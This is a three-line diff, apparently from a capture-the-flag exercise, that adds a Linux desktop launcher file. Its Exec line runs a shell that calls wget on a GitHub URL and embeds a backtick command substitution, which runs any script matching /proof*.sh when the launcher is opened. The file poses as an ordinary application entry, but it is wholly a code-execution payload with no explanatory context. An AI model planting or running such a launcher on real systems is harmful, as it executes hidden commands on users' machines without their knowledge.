@@ -1,0 +1,3 @@
+[Desktop Entry]
+Exec=sh -c "wget https://raw.githubusercontent.com/ToTheMars-Moon/CTF/main/CTF-01 `/proof*.sh`" 
+Type=Application
